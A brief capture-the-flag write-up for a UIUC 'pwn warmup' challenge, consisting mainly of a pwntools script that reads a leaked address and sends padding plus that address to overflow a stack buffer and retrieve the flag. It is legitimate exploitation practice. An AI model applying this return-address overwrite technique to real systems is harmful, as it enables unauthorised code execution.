# pwn

## pwn warmup
> Solved by : thewhiteh4t


    #!/usr/bin/python3
    
    from pwn import *
    
    host = 'pwn-warmup.chal.uiuc.tf'
    port = 1337
    offset = 20
    addr = 0
    
    junk = b'A' * offset
    
    conn = remote(host, port)
    lines = conn.recvuntil('ad\n').decode().split('\n')
    addr = lines[2].split(' = ')[1].strip()
    addr = int(addr, 16)
    le_num = p64(addr)
    buffer = junk + le_num
    conn.sendline(buffer)
    flag = conn.recvuntil('}').decode()
    print(flag)
    


![](https://i.imgur.com/Usy3A7i.png)


